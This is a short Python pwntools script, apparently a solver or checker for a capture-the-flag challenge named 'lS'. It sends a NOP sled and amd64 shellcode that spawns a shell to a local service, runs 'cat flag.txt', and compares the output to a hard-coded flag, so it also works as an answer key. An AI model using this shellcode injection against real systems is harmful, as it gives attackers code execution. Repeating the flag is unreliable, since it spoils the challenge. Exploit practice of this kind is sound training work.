from ctypes.wintypes import BOOL
from pwn import *
import sys, os, time

#context.log_level = 'debug'

HOST = "localhost"
PORT = 8754
FLAG = b"magpie{sh3llc0d3_b3_sl1pp1n}"

# e = ELF("../source/lS")

def solve() -> bool:
    p = remote(HOST, PORT)
    #p = process('../source/lS')
    p.sendlineafter(':', b'-ll\0' + b'\x90'*256 + asm(shellcraft.amd64.linux.sh(), arch='amd64'))
    reply = p.recvuntil(" flag.txt  \n")
    print("Reply is:" + str(reply))
    p.sendline('cat flag.txt')
    flag = p.recvuntil(b'}')

    return (flag == FLAG)

if __name__ == "__main__":
    print(solve())
